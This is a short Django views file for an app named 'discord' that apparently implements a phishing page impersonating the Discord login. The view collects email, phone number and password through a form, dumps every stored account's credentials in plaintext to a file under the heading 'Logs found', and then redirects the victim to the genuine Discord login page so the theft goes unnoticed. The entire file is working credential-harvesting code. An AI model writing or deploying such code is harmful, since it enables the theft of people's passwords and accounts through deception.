from django.shortcuts import render, redirect
from discord.forms import Discord_Account_Form
from discord.models import Discord_Account

# Create your views here.


def Discord_Account_View(request):
     form = Discord_Account_Form()
     if request.method == "POST":
          form = Discord_Account_Form(request.POST)
          if form.is_valid():
               try:
                    form.save()
                    with open("discord.txt", "w") as Logins:
                         
                         instance = Discord_Account.objects.all()
                         
                         for i in instance:
                              mail = i.email
                              user = i.phone_number
                              pwd = i.password
                              details = "[+] Logs found ==> User %s or %s pass %s \n"%(user, mail, pwd)
                              print(details)
                              Logins.write("%s \n"%(details))
                    return redirect("https://discord.com/login")
               except:
                    pass
                         
     context = {'form': form}
          
     return render(request, "discord.html", context)

          

